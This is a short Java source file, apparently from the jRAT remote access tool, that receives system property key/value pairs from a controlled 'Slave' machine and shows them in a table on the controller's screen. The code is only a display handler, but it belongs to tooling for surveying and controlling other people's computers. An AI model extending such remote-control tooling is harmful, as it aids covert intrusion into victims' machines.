package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameSystemVariables;


public class Packet32SystemProperties extends AbstractIncomingPacket {

	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameSystemVariables frame = FrameSystemVariables.INSTANCES.get(slave);
		String key = slave.readLine();
		String value = slave.readLine();
		if (frame != null) {
			frame.model.addRow(new Object[] { key, value });
		}
	}

}
